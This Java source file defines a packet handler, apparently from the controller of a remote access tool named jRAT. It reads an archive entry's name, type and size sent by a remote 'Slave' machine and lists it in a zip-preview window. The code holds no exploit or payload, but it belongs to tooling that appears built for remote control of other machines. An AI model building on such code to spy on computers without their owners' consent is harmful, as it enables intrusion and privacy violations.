package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import javax.swing.Icon;

import pro.jrat.Slave;
import pro.jrat.ui.frames.FramePreviewZip;
import pro.jrat.utils.IconUtils;



public class Packet45ArchivePreview extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		boolean dir = slave.readBoolean();
		String name = slave.readLine();
		String filesize = slave.readLong() + " kB";

		FramePreviewZip frame = FramePreviewZip.instances.get(slave);

		if (frame != null) {
			Icon icon = IconUtils.getFileIconFromExtension(name, dir);

			frame.getModel().addRow(new Object[] { icon, name, dir ? "" : filesize });
		}
	}

}
